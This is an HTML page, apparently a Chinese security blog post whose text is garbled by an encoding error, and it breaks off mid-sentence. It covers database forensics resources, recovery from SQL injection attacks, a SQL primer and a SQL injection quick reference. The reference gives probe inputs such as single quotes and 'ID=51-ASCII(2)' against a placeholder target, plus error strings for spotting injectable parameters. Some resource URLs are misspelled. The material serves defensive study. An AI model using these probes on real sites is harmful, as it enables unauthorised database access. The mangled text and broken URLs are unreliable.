é™¤çš„æ•°æ®ã€‚</p></li></ul><p>æ•°æ®åº“å–è¯èµ„æº</p><table><thead><tr><th align="center">RDBMS</th><th>å›¾   ä¹¦</th><th>ä¸“æ³¨äºä¿¡æ¯å–è¯çš„Webç½‘ç«™</th><th>å·¥   å…·</th></tr></thead><tbody><tr><td align="center">Microsoft  SQL  Server</td><td>SQL Server Forensic Analysisï¼ŒAddison  Wesley Professional</td><td><a href="http://www.applicationfdrensics.com/">www.applicationfdrensics.com</a></td><td>Windows Forensic Toolchest  (SQL)</td></tr><tr><td align="center">Oracle</td><td>Oracle Forensicsï¼Œ  Rampant  Press</td><td><a href="http://www.red-databasesecurity.com/">www.red-databasesecurity.com</a>  <br><a href="http://www.v3rity.com/">www.v3rity.com</a><br><a href="http://www.applicationfbrensics.com/">www.applicationfbrensics.com</a></td><td>McAfee Security Scanner for  Databases</td></tr><tr><td align="center">MySQL</td><td>æ— </td><td><a href="http://www.applicationfbrensics.com/">www.applicationfbrensics.com</a></td><td>æ— </td></tr><tr><td align="center">PostgreSQL</td><td>æ— </td><td><a href="http://www.applicationfbrensics.com/">www.applicationfbrensics.com</a></td><td>æ— </td></tr></tbody></table><h4 id="ä»SQLæ³¨å…¥æ”»å‡»ä¸­æ¢å¤"><a href="#ä»SQLæ³¨å…¥æ”»å‡»ä¸­æ¢å¤" class="headerlink" title="ä»SQLæ³¨å…¥æ”»å‡»ä¸­æ¢å¤"></a>ä»SQLæ³¨å…¥æ”»å‡»ä¸­æ¢å¤</h4><p>é™æ€æœ‰æ•ˆè½½è·ï¼šä»ä¸€ä¸ªå—æŸå®³ç³»ç»Ÿåˆ°å¦å¤–ä¸€ä¸ªå—æŸå®³ç³»ç»Ÿï¼Œåœ¨åæŸå®³(post-compromise)ç³»ç»Ÿä¸Šæ‰§è¡Œçš„æ´»åŠ¨æ˜¯ä¸€è‡´çš„ã€‚</p><p>åŠ¨æ€æœ‰æ•ˆè½½è·ï¼šä»ä¸€ä¸ªå—æŸå®³ç³»ç»Ÿåˆ°å¦å¤–ä¸€ä¸ªå—æŸå®³ç³»ç»Ÿï¼Œåœ¨åæŸå®³(post-compromise)ç³»ç»Ÿä¸Šæ‰§è¡Œçš„æ´»åŠ¨æ˜¯ä¸ä¸€è‡´çš„ã€‚</p><h5 id="ç¡®å®šæ”»å‡»æºå¸¦çš„æœ‰æ•ˆè½½è·"><a href="#ç¡®å®šæ”»å‡»æºå¸¦çš„æœ‰æ•ˆè½½è·" class="headerlink" title="ç¡®å®šæ”»å‡»æºå¸¦çš„æœ‰æ•ˆè½½è·"></a>ç¡®å®šæ”»å‡»æºå¸¦çš„æœ‰æ•ˆè½½è·</h5><p>æ‰§è¡Œä¸‹é¢çš„æ­¥éª¤ï¼Œä»¥è¯†åˆ«æˆåŠŸSQLæ³¨å…¥æ”»å‡»çš„æœ‰æ•ˆè½½è·ï¼š</p><ol><li><p>å¤‡ä»½å—æŸå®³æ•°æ®åº“ï¼šä¸ºå—æŸå®³æ•°æ®åº“åˆ¶ä½œä¸¤ä»½å‰¯æœ¬ã€‚ä¸€ä»½ç”¨äºæ¢å¤æ•°æ®ï¼Œå¦ä¸€ä»½åˆ™ä½œä¸ºå¹²å‡€çš„æ¢å¤ç‚¹ï¼Œä»¥å¤‡åœ¨æ¢å¤å‡ºç°é—®é¢˜æ—¶ä½¿ç”¨ã€‚</p></li><li><p>æå–æ¶æ„çš„SQLæ³¨å…¥æŸ¥è¯¢ï¼Œä»å—æŸå®³çš„WebæœåŠ¡å™¨æ—¥å¿—ã€æ•°æ®åº“æ‰§è¡Œè®¡åˆ’ï¼ŒåŒ…æ‹¬ä»MySQLå’ŒPostgreSQLæ•°æ®åº“æœåŠ¡å™¨çš„statement logå’Œbinary logsä¸­æå–æ¶æ„æŸ¥è¯¢å’Œè¯­å¥çš„å”¯ä¸€æ¸…å•ã€‚</p></li><li><p>ç†è§£æ¶æ„æŸ¥è¯¢çš„é€»è¾‘ï¼šæ£€æŸ¥åˆ—å‡ºçš„æ¶æ„æŸ¥è¯¢å’Œè¯­å¥ï¼Œç¡®å®šå®ƒä»¬æ‰€åˆ›å»ºã€è®¿é—®ã€æ›´æ–°æˆ–åˆ é™¤çš„å¯¹è±¡ï¼Œä»¥åŠæ”»å‡»è€…å¦‚ä½•å®ç°è¿™äº›æ“ä½œã€‚æˆ‘ä»¬éœ€è¦è¿™äº›ä¿¡æ¯æ¥ç¡®å®šå®‰å…¨äº‹ä»¶å½±å“çš„èŒƒå›´ï¼Œ ä»è€Œè§„åˆ’å‡ºæ¢å¤å®‰å…¨äº‹ä»¶çš„æ­¥éª¤ã€‚</p></li><li><p>æœç´¢æ¶æ„æŸ¥è¯¢å‚è€ƒï¼šæˆ‘ä»¬å¯èƒ½å·±ç»å…·æœ‰å·±çŸ¥æ¶æ„è¯­å¥å’Œå‘½ä»¤çš„åˆ—è¡¨ï¼Œå¯ä»¥ä½¿ç”¨è¯¥åˆ—è¡¨ä¸ä¹‹å‰æå–çš„æ¶æ„æŸ¥è¯¢æ¸…å•ç›¸äº’æ¯”å¯¹ï¼Œä»¥è¯†åˆ«æ¶æ„æŸ¥è¯¢çš„æ¥æºã€‚</p></li><li><p>ç¡®å®šæ¶æ„æŸ¥è¯¢æ˜¯é™æ€æœ‰æ•ˆè½½è·è¿˜æ˜¯åŠ¨æ€æœ‰æ•ˆè½½è·çš„ä¸€éƒ¨åˆ†ï¼šä»æœç´¢ç»“æœä¸­å¯ä»¥ç¡®å®šï¼Œ æ”»å‡»æ˜¯ä¸è¯¸å¦‚SQLæ³¨å…¥è •è™«è¿™æ ·çš„é™æ€æœ‰æ•ˆè½½è·æœ‰å…³ï¼Œè¿˜æ˜¯ä¸æ”»å‡»è€…ä½¿ç”¨SQLæ³¨å…¥æ¼æ´åˆ©ç”¨å·¥å…·ã€æŠ•é€ä¼ ç»Ÿå³å¸­æŸ¥è¯¢(ad-hoc)çš„åŠ¨æ€æœ‰æ•ˆè½½è·æœ‰å…³ã€‚</p></li><li><p>æŸ¥æ‰¾å¤šç§æ¼æ´ï¼šåœ¨æ¶æ„æŸ¥è¯¢æ¸…å•ä¸­æ£€æŸ¥æ‰€æœ‰çš„æ¡ç›®ï¼Œå› ä¸ºåŒä¸€ SQLæ³¨å…¥æ¼æ´å¯èƒ½ä¼šè¢«å¤šæ¬¡åˆ©ç”¨ï¼Œæ—¢å¯èƒ½ä½¿ç”¨é™æ€æœ‰æ•ˆè½½è·ä¹Ÿå¯èƒ½é€šè¿‡åŠ¨æ€æœ‰æ•ˆè½½è·ã€‚</p></li></ol><h5 id="ä»æºå¸¦é™æ€æœ‰æ•ˆè½½è·çš„æ”»å‡»ä¸­æ¢å¤"><a href="#ä»æºå¸¦é™æ€æœ‰æ•ˆè½½è·çš„æ”»å‡»ä¸­æ¢å¤" class="headerlink" title="ä»æºå¸¦é™æ€æœ‰æ•ˆè½½è·çš„æ”»å‡»ä¸­æ¢å¤"></a>ä»æºå¸¦é™æ€æœ‰æ•ˆè½½è·çš„æ”»å‡»ä¸­æ¢å¤</h5><p>æ¢å¤çš„æ ¸å¿ƒé—®é¢˜ï¼Œæ˜¯å°†æ•°æ®åº“å›æ»šåˆ°å—æ”»å‡»å½±å“ä¹‹å‰çš„çŠ¶æ€ï¼Œæˆ–è€…è¯†åˆ«å¹¶å–æ¶ˆ (undo)é‚£äº›æ¶æ„æŸ¥è¯¢å’Œè¯­å¥æ‰€æ‰§è¡Œçš„å…·ä½“æ“ä½œã€‚</p><p>ä»æºå¸¦é™æ€æœ‰æ•ˆè½½è·çš„æ”»å‡»ä¸­è¿›è¡Œæ¢å¤çš„æ­¥éª¤ï¼š</p><ol><li><p>æ¢å¤æ•°æ®åº“çŠ¶æ€</p><ul><li>ä»å¤‡ä»½ä¸­æ¢å¤</li><li>æ ‡è¯†è¦å›æ»šçš„äº‹åŠ¡</li></ul></li><li><p>æ£€éªŒæ•°æ®åº“æœåŠ¡å™¨é…ç½®ï¼šå¦‚æœé™æ€æœ‰æ•ˆè½½è·å¸¦æœ‰é¢‘ç¹é’ˆå¯¹RDBMSç‰¹æ€§çš„æ”»å‡»ï¼Œæˆ–è€…è§£é™¤æœåŠ¡å™¨çš„å®‰å…¨é…ç½®ä»¥å®ç°è¿›ä¸€æ­¥çš„æ”»å‡»ï¼Œé‚£ä¹ˆåº”è¯¥å°†æ•°æ®åº“æœåŠ¡å™¨çš„é…ç½®æ¢å¤åˆ°å·²çŸ¥çš„è‰¯å¥½çŠ¶æ€ã€‚</p></li><li><p>è¯†åˆ«å¹¶ä¿®å¤SQLæ³¨å…¥æ¼æ´ï¼šç¡®ä¿å¯¹æ•´ä¸ªä»£ç åº“è¿›è¡Œä¸€æ¬¡åº”ç”¨ç¨‹åºå®‰å…¨è¯„ä¼°ï¼Œä»¥è¯†åˆ«å¯è¢«åˆ©ç”¨çš„æ¼æ´å’Œå…¶ä»–å¯èƒ½å­˜åœ¨çš„æƒ…å†µã€‚</p></li><li><p>åœ¨çº¿æ¢å¤ç³»ç»Ÿå¹¶æ¢å¤WebæœåŠ¡ã€‚</p></li></ol><h5 id="ä»æºå¸¦åŠ¨æ€æœ‰æ•ˆè½½è·çš„æ”»å‡»ä¸­æ¢å¤"><a href="#ä»æºå¸¦åŠ¨æ€æœ‰æ•ˆè½½è·çš„æ”»å‡»ä¸­æ¢å¤" class="headerlink" title="ä»æºå¸¦åŠ¨æ€æœ‰æ•ˆè½½è·çš„æ”»å‡»ä¸­æ¢å¤"></a>ä»æºå¸¦åŠ¨æ€æœ‰æ•ˆè½½è·çš„æ”»å‡»ä¸­æ¢å¤</h5><p>å¯¹äºæºå¸¦åŠ¨æ€æœ‰æ•ˆè½½è·çš„æˆåŠŸæ”»å‡»ï¼Œå¼ºçƒˆå»ºè®®è˜è¯·æ•°æ®åº“å–è¯ä¸“å®¶è¿›è¡Œè°ƒæŸ¥å–è¯ã€‚</p><p>å¯ä»¥éµå¾ªä¸‹åˆ—æ­¥éª¤ï¼š</p><ol><li><p>æ¢å¤æ•°æ®åº“çŠ¶æ€ï¼šå¯¹äºåŠ¨æ€æœ‰æ•ˆè½½è·çš„SQLæ³¨å…¥æ”»å‡»ï¼Œå»ºè®®å°†RDBMSå’Œæ“ä½œç³»ç»Ÿéƒ½æ¢å¤åˆ°å—æŸå®³ä¹‹å‰çš„çŠ¶æ€ã€‚</p></li><li><p>è¯†åˆ«è„±ç¦»æ•°æ®åº“çš„æ´»åŠ¨ï¼šåœ¨ä¹‹å‰æ”¶é›†å¥½çš„æ¶æ„æŸ¥è¯¢æ¸…å•ä¸­ï¼Œåº”è¯¥æ ‡è¯†å‡ºé‚£äº›å…è®¸æ”»å‡»è€…è„±ç¦»æ•°æ®åº“æœåŠ¡å™¨ã€è¿›å…¥åº•å±‚æ“ä½œç³»ç»Ÿçš„æ–‡ä»¶ç³»ç»Ÿæˆ–æ³¨å†Œè¡¨çš„è¯­å¥ã€‚å¦‚æœå‘ç°é’ˆå¯¹æ“ä½œç³»ç»Ÿçš„æ´»åŠ¨ï¼Œå°±åº”è¯¥æ‰§è¡Œä¸‹åˆ—æ“ä½œï¼š</p><ul><li>æŸ¥æ‰¾åˆ›å»ºäº†å¸¦å¤–é€šä¿¡çš„ä»»ä½•æ–¹æ³•</li><li>æŸ¥æ‰¾å¯¹æ“ä½œç³»ç»Ÿæ–‡ä»¶çš„å¼•ç”¨ï¼Œæˆ–è€…æ”»å‡»è€…è¯»å–ã€åˆ›å»ºæˆ–åŠ è½½åˆ°æ•°æ®åº“ä¸­çš„æ³¨å†Œè¡¨é”®å€¼ (key)ã€‚</li></ul></li><li><p>æ£€éªŒæ•°æ®åº“æœåŠ¡å™¨çš„é…ç½®ï¼šä¸€æ—¦æ”»å‡»è€…è·å¾—å¯¹æ•°æ®åº“æœåŠ¡å™¨çš„è®¿é—®ä¹‹åï¼Œä»–å°±ä¼šè§£é™¤å­˜åœ¨çš„å®‰å…¨è®¾ç½®ï¼Œä»¥ä¾¿è¿›ä¸€æ­¥åœ¨æœåŠ¡å™¨ä¸Šå®æ–½æ”»å‡»ã€‚</p></li><li><p>è¯†åˆ«å¹¶ä¿®å¤SQLæ³¨å…¥æ¼æ´ï¼šç¡®ä¿å¯¹æ•´ä¸ªä»£ç åº“è¿›è¡Œä¸€æ¬¡åº”ç”¨ç¨‹åºå®‰å…¨è¯„ä¼°ï¼Œä»¥è¯†åˆ«å¯è¢«åˆ©ç”¨çš„æ¼æ´å’Œå…¶ä»–å¯èƒ½å­˜åœ¨çš„æƒ…å†µã€‚</p></li><li><p>åœ¨çº¿æ¢å¤ç³»ç»Ÿå¹¶æ¢å¤WebæœåŠ¡ã€‚</p></li></ol><h2 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h2><h3 id="SQLå…¥é—¨"><a href="#SQLå…¥é—¨" class="headerlink" title="SQLå…¥é—¨"></a>SQLå…¥é—¨</h3><h4 id="SQLæŸ¥è¯¢"><a href="#SQLæŸ¥è¯¢" class="headerlink" title="SQLæŸ¥è¯¢"></a>SQLæŸ¥è¯¢</h4><ol><li>SELECä¸è¯­å¥</li></ol><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> tblUsers<span class="token keyword">SELECT</span> username <span class="token keyword">FROM</span> tblUsers<span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> tblUsers <span class="token keyword">WHERE</span> username <span class="token operator">=</span> <span class="token string">'admin'</span> <span class="token operator">AND</span> password <span class="token operator">=</span> <span class="token string">'letmein'</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">INTO</span> hackerTable <span class="token keyword">FROM</span> tblUsers<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li>UNIONè¿ç®—ç¬¦</li></ol><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> username<span class="token punctuation">,</span> password <span class="token keyword">FROM</span> tblUsers <span class="token keyword">UNION</span> <span class="token keyword">SELECT</span> username<span class="token punctuation">,</span> password <span class="token keyword">FROM</span> tblAdmins<span class="token keyword">SELECT</span> username<span class="token punctuation">,</span> password <span class="token keyword">FROM</span> tblUsers <span class="token keyword">UNION</span> <span class="token keyword">ALL</span> <span class="token keyword">SELECT</span> username<span class="token punctuation">,</span> password <span class="token keyword">FROM</span> tblAdmins<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol start="3"><li>INSERT è¯­å¥</li></ol><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> tblUsers <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token string">'john'</span><span class="token punctuation">,</span><span class="token string">'smith'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> tblUsers<span class="token punctuation">(</span>id<span class="token punctuation">,</span> username<span class="token punctuation">,</span> password<span class="token punctuation">,</span> priv<span class="token punctuation">)</span> <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token string">'john'</span><span class="token punctuation">,</span><span class="token string">'smith'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol start="4"><li>UPDATE è¯­å¥</li></ol><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">UPDATE</span> tblUsers <span class="token keyword">SET</span> priv<span class="token operator">=</span><span class="token number">0</span> <span class="token keyword">WHERE</span> username <span class="token operator">=</span> <span class="token string">'sarah'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="5"><li>DELETE è¯­å¥</li></ol><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">DELETE</span> <span class="token keyword">FROM</span> tblUsers <span class="token keyword">WHERE</span> username <span class="token operator">=</span> <span class="token string">'admin'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="6"><li>DROPè¯­å¥</li></ol><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">DROP</span> <span class="token keyword">TABLE</span> tblUsers<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="7"><li>CREATE TABLE è¯­å¥</li></ol><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> shoppinglist<span class="token punctuation">(</span>item <span class="token keyword">int</span><span class="token punctuation">,</span> name <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> shoppinglist <span class="token keyword">as</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> dba_users<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol start="8"><li>ALTER TABLE è¯­å¥</li></ol><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">ALTER</span> <span class="token keyword">TABLE</span> tblUsers <span class="token keyword">ADD</span> comments <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token keyword">ALTER</span> <span class="token keyword">TABLE</span> tblUsers <span class="token keyword">DROP</span> <span class="token keyword">COLUMN</span> comments<span class="token keyword">ALTER</span> <span class="token keyword">TABLE</span> tblUsers <span class="token keyword">ALTER</span> <span class="token keyword">COLUMN</span> comments <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ol start="9"><li>GROUP BYè¯­å¥</li></ol><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> customer<span class="token punctuation">,</span> <span class="token function">SUM</span><span class="token punctuation">(</span>cost<span class="token punctuation">)</span> <span class="token keyword">FROM</span> orders <span class="token keyword">WHERE</span> customer <span class="token operator">=</span> <span class="token string">'Anthony Anteater'</span> <span class="token keyword">GROUP</span> <span class="token keyword">BY</span> customer<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="10"><li>ORDER BY å­å¥</li></ol><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> cost<span class="token punctuation">,</span>product <span class="token keyword">FROM</span> orders <span class="token keyword">ORDER</span> <span class="token keyword">BY</span> <span class="token keyword">DESC</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="11"><li>é™åˆ¶ç»“æœé›†</li></ol><h3 id="SQLæ³¨å…¥å¿«é€Ÿå‚è€ƒ"><a href="#SQLæ³¨å…¥å¿«é€Ÿå‚è€ƒ" class="headerlink" title="SQLæ³¨å…¥å¿«é€Ÿå‚è€ƒ"></a>SQLæ³¨å…¥å¿«é€Ÿå‚è€ƒ</h3><h4 id="è¯†åˆ«SQLæ³¨å…¥æ¼æ´"><a href="#è¯†åˆ«SQLæ³¨å…¥æ¼æ´" class="headerlink" title="è¯†åˆ«SQLæ³¨å…¥æ¼æ´"></a>è¯†åˆ«SQLæ³¨å…¥æ¼æ´</h4><p>å‘ç°SQLæ³¨å…¥ç¼ºé™·</p><table><thead><tr><th>æ–¹   æ³•</th><th>æ   è¿°</th></tr></thead><tbody><tr><td>å¼‚å¸¸çš„è¾“å…¥æ˜¯å¦ä¼šäº§ç”Ÿæ•°æ®åº“ é”™è¯¯ï¼Ÿ</td><td>è¾“å…¥SQLå…ƒå­—ç¬¦æˆ–å¼‚å¸¸ã€é”™è¯¯çš„æ•°æ®ç±»å‹ï¼Œæœ‰å¯èƒ½äº§ç”Ÿæ•°æ®åº“é”™è¯¯ã€‚å¸¸è§çš„æµ‹è¯•ç”¨ä¾‹åŒ…æ‹¬åœ¨å­—ç¬¦ä¸²å­—æ®µä¸­è¾“å…¥å•å¼•å·(â€˜)å­—ç¬¦ï¼Œæˆ–è€…åœ¨æ•°å€¼å­—æ®µä¸­è¾“å…¥éšæœºçš„å­—ç¬¦ä¸²ã€‚é€šå¸¸å¯ä»¥é€šè¿‡HTTPçŠ¶æ€ä»£ç 500ï¼Œæˆ–è€…é¡µé¢ä¸­æè¿°æ€§çš„é”™è¯¯æ¶ˆæ¯æ¥è¯†åˆ«è¿™ç§æ•°æ®åº“é”™è¯¯ã€‚æäº¤å¼‚å¸¸æ•°æ®å¹¶åˆ†ææœåŠ¡å™¨å“åº”ä¸­çš„ä¸‹åˆ—å­—ç¬¦ä¸²ï¼Œæœ‰åŠ©äºè¯†åˆ«SQLæ³¨å…¥æ¼æ´ï¼š<br><code>Microsoft OLE DB Provider  ORA-  PLS-  error in your SQL Syntax  80040E14  SQL Error  Incorrect Syntax near  SQLServer  Failed MySQL  Unclosed Quotation Mark  JDBC Driver  ODBC Driver  SQL  ODBC  </code></td></tr><tr><td>åˆæ³•ã€æ­£ç¡®çš„è¾“å…¥æ˜¯å¦å¯ä»¥æ›¿æ¢ ç­‰æ•ˆçš„SQLè¡¨è¾¾å¼ï¼Ÿ</td><td>å¦‚æœé‡åˆ°äº†é”™è¯¯ï¼Œä¿®æ”¹è¾“å…¥çš„æ•°æ®ä»¥åˆ†æé”™è¯¯ï¼Œç¡®å®šè¾“å…¥çš„æ•°æ®æ˜¯å¦å¯¼è‡´äº†SQLè¯­æ³•é”™è¯¯ã€‚ä¾‹å¦‚ï¼ŒåŒå€ä½¿ç”¨å•å¼•å·å­—ç¬¦â€”â€”å¦‚æœä¸€ä¸ªå¼•å·å¯¼è‡´äº†é”™è¯¯ï¼Œè€Œä¸¤ä¸ªå¼•å·æ²¡æœ‰äº§ç”Ÿé”™è¯¯ï¼Œé‚£ä¹ˆå¾ˆæœ‰å¯èƒ½å­˜åœ¨æœªå‘ç°çš„SQLæ³¨å…¥ç¼ºé™·ã€‚è¯·æ³¨æ„ï¼Œç”±é”™è¯¯æ•°æ®ç±»å‹å¯¼è‡´çš„é”™è¯¯å¯ä»¥æ˜¯é¢„æœŸçš„å¹¶å…·æœ‰æ­£å¸¸çš„è¡¨ç°ã€‚ ä¾‹å¦‚ï¼Œå¦‚æœåœ¨éœ€è¦æ•°å€¼çš„åœ°æ–¹æä¾›äº†å­—ç¬¦ä¸²æ•°æ®ï¼Œé‚£ä¹ˆå¾ˆå¤šåº”ç”¨ç¨‹åºå°† äº§ç”Ÿé”™è¯¯ã€‚è¿™æ—¶åº”è¯¥è¿›ä¸€æ­¥é‡‡ç”¨å…¶ä»–æŠ€æœ¯æ¥ç¡®è®¤æ˜¯å¦å­˜åœ¨SQLæ³¨å…¥æ¼æ´ã€‚ åœ¨é‡‡ç”¨è¿™ç§æ£€æµ‹æŠ€æœ¯ä¹‹å‰ï¼Œåˆ¤æ–­æ‰€æµ‹è¯•çš„è¾“å…¥å¯¹äºæœåŠ¡å™¨çš„å“åº”æ˜¯å¦æœ‰å½±å“æ˜¯å¾ˆé‡è¦çš„ã€‚ä¾‹å¦‚ï¼Œå¦‚æœæä¾›äº†ä¸€ä¸ªæ•°å€¼ï¼Œé‚£ä¹ˆå°è¯•ä½¿ç”¨å¦ä¸€ä¸ªä¸åŒçš„æ•°å€¼å¹¶ç¡®å®šæ˜¯å¦äº§ç”Ÿäº†å¯åº¦é‡ä¸”ä¸€è‡´çš„å·®å¼‚ã€‚å¯¹äºå­—ç¬¦ä¸²å€¼ï¼Œ ä½¿ç”¨åŒä¸€å­—ç¬¦é›†ï¼Œå¹¶å°†å­—ç¬¦ä¸²å€¼ä¿®æ”¹ä¸ºä¸€ä¸ªç›¸åŒé•¿åº¦çš„éšæœºå­—ç¬¦ä¸²ï¼Œ ç„¶åè§‚å¯Ÿåº”ç”¨ç¨‹åºçš„å“åº”ã€‚å¦‚æœå¯¹æ•°æ®çš„ä¿®æ”¹å¹¶æ²¡æœ‰å¯¹é¡µé¢é•¿åº¦ã€å†…å®¹æˆ–HTTPå“åº”ä»£ç äº§ç”Ÿä¸€è‡´çš„å·®åˆ«ï¼Œé‚£ä¹ˆè¯¥æŠ€æœ¯ä¸å¤ªå¯èƒ½æˆåŠŸã€‚</td></tr><tr><td>åˆæ³•ã€æ­£ç¡®çš„è¾“å…¥æ˜¯å¦å¯ä»¥æ›¿æ¢ ç­‰æ•ˆçš„SQLè¡¨è¾¾å¼ï¼Ÿ</td><td>æ•°å€¼æ•°æ®åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ä»¬å°†å‡å®šæµ‹è¯•ä¸€ä¸ªä¼ é€’ç»™news.phpè„šæœ¬çš„æ•°å€¼ç±»å‹çš„IDå‚æ•°ã€‚ä¸‹é¢ä¸¤ä¸ªè¯·æ±‚äº§ç”Ÿäº†ä¸åŒçš„å“åº”ï¼Œå› æ­¤å¯ä»¥è®¤ä¸ºIDå‚æ•°æ˜¯åŠ¨æ€çš„ï¼Œå¹¶ä¸”å¯ä»¥ç”¨äºè¿™ç§æµ‹è¯•æ–¹æ³•ã€‚<br><a href="http://target/news.php?ID=1">http://target/news.php?ID=1</a><br><a href="http://target/news.php?ID=2">http://target/news.php?ID=2</a> <br>åœ¨æµ‹è¯•è¿‡ç¨‹ä¸­ï¼Œä¸‹ä¸€ä¸ªæ­¥éª¤æ˜¯æäº¤ä¸€ä¸ªSQLè¡¨è¾¾å¼ï¼Œè¯¥è¡¨è¾¾å¼å°†è¢«è®¡ç®—ä¸ºäº‹å…ˆç¡®å®šå¥½çš„æ­£ç¡®å€¼ï¼ˆæ¯”å¦‚ä¸Šé¢ä¾‹å­ä¸­çš„1å’Œ2ï¼‰ã€‚ç„¶åå°†å¯¹æ¯ä¸€ä¸ªè¡¨è¾¾å¼çš„å“åº”ä¸åˆå§‹æµ‹è¯•æ—¶çš„å“åº”è¿›è¡Œæ¯”è¾ƒï¼Œä»¥ç¡®å®šæ˜¯å¦å¯¹è¯¥è¡¨è¾¾å¼  è¿›è¡Œäº†è®¡ç®—ã€‚åœ¨è¿™ç§ç±»å‹çš„æµ‹è¯•ä¸­ï¼Œå¸¸ç”¨çš„SQLå‡½æ•°æ˜¯ASCII(),å¯¹äºæ‰€æä¾›çš„ASCIIå­—ç¬¦ï¼Œè¯¥å‡½æ•°å°†è¿”å›ä¸€ä¸ªæ•´æ•°ã€‚å› æ­¤ï¼Œä¸‹é¢çš„SQLè¡¨è¾¾å¼åº”è¯¥è¿”å›å€¼1( â€œ2â€çš„ASCTç¼–ç å€¼æ˜¯50)<br>51-ASCII(2) <br>å¦‚æœæˆ‘ä»¬çš„è¾“å…¥è¢«SQL Serverä»¥ä¸å®‰å…¨çš„æ–¹å¼è§£æï¼Œé‚£ä¹ˆä¸‹åˆ—è¯·æ±‚åº”è¯¥ç­‰ä»·äºåŸå§‹çš„è¯·æ±‚ï¼š<br><a href="http://target/news.php?ID=51-ASCII(2)">http://target/news.php?ID=51-ASCII(2)</a><br>â€“ ç­‰ä»·æ‰‹ID=1 <br><a href="http://target/news.php?ID=52-ASCII(2)">http://target/news.php?ID=52-ASCII(2)</a><br>â€“ ç­‰ä»·æ‰‹ID=2 <br>ç»å¤§å¤šæ•°ä¸»æµæ•°æ®åº“å¹³å°éƒ½æ”¯æŒASCII()å‡½æ•°ï¼ŒåŒ…æ‹¬Microsoft SQL  Serverã€Oracleã€MySQL å’Œ PostgreSQLã€‚ è¯·ä½¿ç”¨ç±»ä¼¼çš„ç®—æœ¯è¡¨è¾¾å¼æ¥ç¡®è®¤ç»“æœã€‚å­—ç¬¦ä¸²æ•°æ® å½“å¤„ç†å­—ç¬¦ä¸²æ•°æ®æ—¶ï¼Œå¯ä»¥é‡‡ç”¨ä¸è¯„ä¼°æ•°å€¼å‚æ•°ç±»ä¼¼çš„æ–¹æ³•ã€‚ä¸å‰é¢çš„ä¾‹å­ä¸€æ ·ï¼Œç¬¬ä¸€æ­¥æ˜¯ä»åº”ç”¨ç¨‹åºè·å–æœ‰æ•ˆçš„å€¼ï¼Œå¹¶ç¡®å®šå½“æ”¹å˜è¯¥å€¼æ—¶æœåŠ¡å™¨çš„å“åº”ä¹Ÿä¸€è‡´åœ°äº§ç”Ÿå·®å¼‚ã€‚åœ¨æœ¬ä¾‹ä¸­ï¼Œæˆ‘ä»¬å‡å®šä¸‹é¢çš„è¯·æ±‚å‚æ•°å€¼å°†äº§ç”Ÿä¸åŒçš„ç»“æœï¼š<br><a href="http://target/products.asp?catagory=shoes">http://target/products.asp?catagory=shoes</a><br><a href="http://target/products.asp?catagory=blahfoo">http://target/products.asp?catagory=blahfoo</a><br>åœ¨æµ‹è¯•å­—ç¬¦ä¸²æ•°æ®æ—¶ï¼Œä¸€ç§å¸¸ç”¨çš„ç­–ç•¥æ˜¯å°†å­—ç¬¦ä¸²æ‹†åˆ†ä¸ºä¸¤ä¸ªæˆ–å¤šä¸ªå­ä¸²ï¼Œç„¶åå†ä½¿ç”¨SQLè¯­æ³•åœ¨æœåŠ¡å™¨ç«¯å°†è¿™äº›å­ä¸²è¿æ¥èµ·æ¥ã€‚ä¸€ä¸ªé‡è¦çš„é™„åŠ è¯´æ˜æ˜¯ï¼šå¯¹äºå­—ç¬¦ä¸²çš„è¿æ¥ï¼Œéœ€è¦æ 